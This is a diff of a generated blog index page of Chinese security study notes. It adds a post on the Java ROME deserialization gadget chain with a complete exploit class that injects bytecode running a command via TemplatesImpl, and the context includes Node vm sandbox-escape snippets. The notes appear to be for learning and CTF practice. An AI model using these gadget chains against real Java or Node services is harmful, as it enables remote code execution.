@@ -157,6 +157,225 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/12/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/unknown.jpg">
+      <meta itemprop="name" content="unknown">
+      <meta itemprop="description" content="hhh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="unknown's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/12/1/" class="post-title-link" itemprop="url">1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-05-12 17:42:31 / Modified: 17:48:01" itemprop="dateCreated datePublished" datetime="2023-05-12T17:42:31+08:00">2023-05-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <img src="/2023/05/12/1/unknown.jpg" class="" title="这是一张图片">
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/12/Rome/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/unknown.jpg">
+      <meta itemprop="name" content="unknown">
+      <meta itemprop="description" content="hhh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="unknown's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/12/Rome/" class="post-title-link" itemprop="url">Rome 调试</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-05-12 17:42:31 / Modified: 18:48:13" itemprop="dateCreated datePublished" datetime="2023-05-12T17:42:31+08:00">2023-05-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h1><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>自己的写法。带箭头表示方法，缩进表示从属关系。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HashMap</span><br><span class="line">    -&gt;readObject</span><br><span class="line">    -&gt;hash(key)</span><br><span class="line">ObjectBean</span><br><span class="line">    -&gt;_equalsBean.hashCode()</span><br><span class="line">EqualsBean</span><br><span class="line">    -&gt;beanHashCode()</span><br><span class="line">    -&gt;_obj.toString()</span><br><span class="line">ToStringBean</span><br><span class="line">    -&gt;toString()</span><br><span class="line">    -&gt;toString(String)</span><br><span class="line">        -&gt;BeanIntrospector.getPropertyDescriptors(this._beanClass)</span><br><span class="line">        -&gt;pReadMethod.invoke(this._obj, NO_PARAMS)</span><br><span class="line">TemplatesImpl</span><br><span class="line">    -&gt;getOutputProperties()</span><br><span class="line">    -&gt;newTransformer()</span><br><span class="line">    -&gt;getTransletInstance()</span><br><span class="line">        -&gt;defineTransletClasses()</span><br><span class="line">            -&gt;defineClass(_bytecodes[i])</span><br><span class="line">        -&gt;_class[_transletIndex].newInstance()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">package romeTest;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class Solve5 &#123;</span><br><span class="line">    public static class HelloooAbstractTranslet&#123;&#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        String payload = &quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;;</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = classPool.get(HelloooAbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(payload);</span><br><span class="line">        byte[] bytes0 = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;,new byte[][]&#123;bytes0&#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        ObjectBean objectBean = new ObjectBean(Templates.class,templates);</span><br><span class="line">        EqualsBean equalsBean = new EqualsBean(Serializable.class,objectBean);</span><br><span class="line">        ObjectBean objectBean1 = new ObjectBean(String.class,&quot;123&quot;); //随便设一个类和父类，后期反射更改</span><br><span class="line"></span><br><span class="line">        //ObjectBean objectBean1 = new ObjectBean(EqualsBean.class,equalsBean);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(objectBean1,123);</span><br><span class="line">//        涉及到HashMap就会涉及到put的规避操作,一般规避有俩种：1.在链子中间拆；2.处理HashMap</span><br><span class="line"></span><br><span class="line">        Class clazz = ObjectBean.class;</span><br><span class="line">        Field equalsBean1 = clazz.getDeclaredField(&quot;_equalsBean&quot;);</span><br><span class="line">        equalsBean1.setAccessible(true);</span><br><span class="line">        equalsBean1.set(objectBean1,equalsBean);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;bin&quot;));</span><br><span class="line">        in.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj,String fieldname,Object value) throws Exception, IllegalAccessException &#123;</span><br><span class="line">        Class clazz=obj.getClass();</span><br><span class="line">        Field field= clazz.getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="关于恶意字节码的生成"><a href="#关于恶意字节码的生成" class="headerlink" title="关于恶意字节码的生成"></a>关于恶意字节码的生成</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static class HelloooAbstractTranslet&#123;&#125;</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    String payload = &quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;;</span><br><span class="line">    ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">    CtClass ctClass = classPool.get(HelloooAbstractTranslet.class.getName());</span><br><span class="line"></span><br><span class="line">    ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class="line">    ctClass.makeClassInitializer().insertBefore(payload);</span><br><span class="line">    byte[] bytes0 = ctClass.toBytecode();</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>将bytes0 base64之后就可以拿来就用，本地不用写HelloooAbstractTranslet类了。因为底层defineClass时，类名传的是null，不会到本地寻找class文件。</p>
+<h2 id="关于HashMap-put"><a href="#关于HashMap-put" class="headerlink" title="关于HashMap.put"></a>关于HashMap.put</h2><p>getTransletInstance()<br>到这一步会判断_class是否为null，是则一直往下执行到defineClass，并将得到的类存到_class，接着再newInstance。</p>
+<p>若提前执行put，就会执行key的hash，一路走到defineClass，会弹计算器，此时_class就有值了。下次readObject就不会走defineClass了。</p>
+<p>所以在创建objectBean1时两个参数应该随便设置，put之后再反射修改。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/12/readObject/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/unknown.jpg">
+      <meta itemprop="name" content="unknown">
+      <meta itemprop="description" content="hhh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="unknown's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/12/readObject/" class="post-title-link" itemprop="url">readObject执行流程</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-05-12 17:42:31 / Modified: 18:49:11" itemprop="dateCreated datePublished" datetime="2023-05-12T17:42:31+08:00">2023-05-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="主要调用栈"><a href="#主要调用栈" class="headerlink" title="主要调用栈"></a>主要调用栈</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">readObject0()</span><br><span class="line">    readOrdinaryObject() if(peekByte为TC_OBJECT,即115)</span><br><span class="line">        desc = readClassDesc(unshared)</span><br><span class="line">            readNonProxyDesc(unshared) if(peekByte为TC_CLASSDESC,即114)</span><br><span class="line">                readDesc = readClassDescriptor() //readDesc保存了反序列化的类名和字段名和类型</span><br><span class="line">                resolveClass(readDesc)</span><br><span class="line">                	Class.forName(name,...</span><br><span class="line">        obj = desc.newInstance() //得到反序列化对象obj</span><br><span class="line">        readSerialData(obj,desc) //给obj对象字段赋值	</span><br><span class="line">        	hasReadObjectMethod() //判断的是desc的readObjectMethod属性，有则执行对象的readObject方法没有则继续往下</span><br><span class="line">        	defaultReadFields(obj, slotDesc) //没有readObjectMethod则执行这个</span><br></pre></td></tr></table></figure>
+
+<p>ObjectInputStream有一个属性bin，bin有一个in，in.buf保存了读取的字节，in.pos表示当前读到那个字节。in.pos一开始就是4。</p>
+<p>readClassDesc得到的desc保存了被反序列化对象的信息</p>
+<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20230512133852384.png" alt="image-20230512133852384"></p>
+<h1 id="关于defaultReadObject"><a href="#关于defaultReadObject" class="headerlink" title="关于defaultReadObject"></a>关于defaultReadObject</h1><p>上面的调用栈，若hasReadObjectMethod判断成功，则不执行defaultReadFields，即不会给对象赋值。</p>
+<p>此时在重写的readObject里调用in.defaultReadObject，里面会执行defaultReadFields，和上面的defaultReadFields作用是一样的。</p>
+<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20230512132221417.png" alt="image-20230512132221417"></p>
+<h1 id="反序列化对象属性是对象"><a href="#反序列化对象属性是对象" class="headerlink" title="反序列化对象属性是对象"></a>反序列化对象属性是对象</h1><p>情景：user对象里还有一个user2，这个user2也是Serializable的。</p>
+<p>在user的defaultReadFields中：</p>
+<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20230512134837948.png" alt="image-20230512134837948"></p>
+<p>getNumObjectFields得到字段是对象的个数，然后创建数组，调用readObject0，反序列化对象。</p>
+<p>readObject0仍然在当前ObjectInputStream对象里执行。</p>
+<p>得到所有对象字段后，再setObjectFieldValues。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/12/123/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -182,7 +401,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2023-05-12 17:01:46 / Modified: 17:41:16" itemprop="dateCreated datePublished" datetime="2023-05-12T17:01:46+08:00">2023-05-12</time>
+              <time title="Created: 2023-05-12 17:01:46 / Modified: 18:04:20" itemprop="dateCreated datePublished" datetime="2023-05-12T17:01:46+08:00">2023-05-12</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -205,7 +424,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><img src="/unknown.jpg" alt="unknown"></p>
+          <p><img src="unknown.jpg"></p>
 
       
     </div>
@@ -817,7 +1036,7 @@
 
 <h2 id="VM沙箱"><a href="#VM沙箱" class="headerlink" title="VM沙箱"></a>VM沙箱</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859#toc-3">https://xz.aliyun.com/t/11859#toc-3</a></p>
 <p>vm.runInThisContext</p>
-<p><img src="/.%5Cimg%5Cvm-1.png" alt="vm-1"></p>
+<p><img src=".%5Cimg%5Cvm-1.png" alt="vm-1"></p>
 <ul>
 <li><p>逃逸原理：传入一个不属于沙箱环境的对象引用，让该引用访问global。沙箱本身不能访问global</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;)</span><br><span class="line">var s = &#123;m:1,n:[]&#125;</span><br><span class="line">vm.runInNewContext(`n.constructor.constructor(&#x27;console.log(1)&#x27;)()`,s)</span><br><span class="line">// vm.runInNewContext(`m.constructor.constructor(&#x27;console.log(1)&#x27;)()`,s)</span><br><span class="line">console.log(s)</span><br><span class="line"></span><br><span class="line">此时s是沙箱，沙箱里的n实际上还是外部的n，n是对象，传进去的是地址，所以能访问外部的global。m是普通变量，传值，所以不能访问外部。</span><br><span class="line"></span><br><span class="line">方式2</span><br><span class="line">---------------------------------------</span><br><span class="line">const vm = require(&#x27;vm&#x27;)</span><br><span class="line">var s = &#123;m:1,n:[],c:2&#125;</span><br><span class="line">vm.runInNewContext(`a = this.c`,s)</span><br><span class="line">console.log(s)//&#123; m: 1, n: [], c: 2, a: 2 &#125;</span><br><span class="line"></span><br><span class="line">this指传进去的沙箱</span><br><span class="line">---------------------------------------</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line">const y1 = vm.runInNewContext(`this.constructor.constructor(&#x27;return process.env&#x27;)()`);</span><br><span class="line">//const y1 = vm.runInNewContext(`this.toString.constructor(&#x27;return process&#x27;)()`)()`);也可以</span><br><span class="line"></span><br><span class="line">console.log(y1);</span><br><span class="line"></span><br><span class="line">猜测：runInNewContext不传沙箱，默认在外面创建沙箱，然后传进去，此时的this就是外面创建的沙箱。</span><br></pre></td></tr></table></figure>
@@ -834,7 +1053,7 @@
 </ul>
 <h1 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var identifier type</span><br><span class="line">var v_name = value 根据值自行判定变量类型。</span><br><span class="line"></span><br><span class="line">intVal := 1 //:= 是一个声明语句</span><br><span class="line"></span><br><span class="line">var intVal int </span><br><span class="line">intVal :=1 // 这时候会产生编译错误，因为 intVal 已经声明</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">包机制</span><br><span class="line">同一目录下只能存在一个包</span><br><span class="line">目录和目录下源文件的包命名可以不同</span><br><span class="line">当包名与目录名不同时，导入的是目录</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.%5Cimg%5Cimage-20230214113649480.png" alt="image-20230214113649480"></p>
+<p><img src=".%5Cimg%5Cimage-20230214113649480.png" alt="image-20230214113649480"></p>
 <ul>
 <li><p>整数溢出</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var b uint = 4294967295 //32位机器unit最大是4294967295，64位机器则不同</span><br><span class="line">var c uint8 = 255</span><br><span class="line">fmt.Println(b+1)//0</span><br><span class="line">fmt.Println(b+2)//1</span><br><span class="line">fmt.Println(c+1)//0</span><br></pre></td></tr></table></figure>
@@ -1022,14 +1241,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
   </nav>
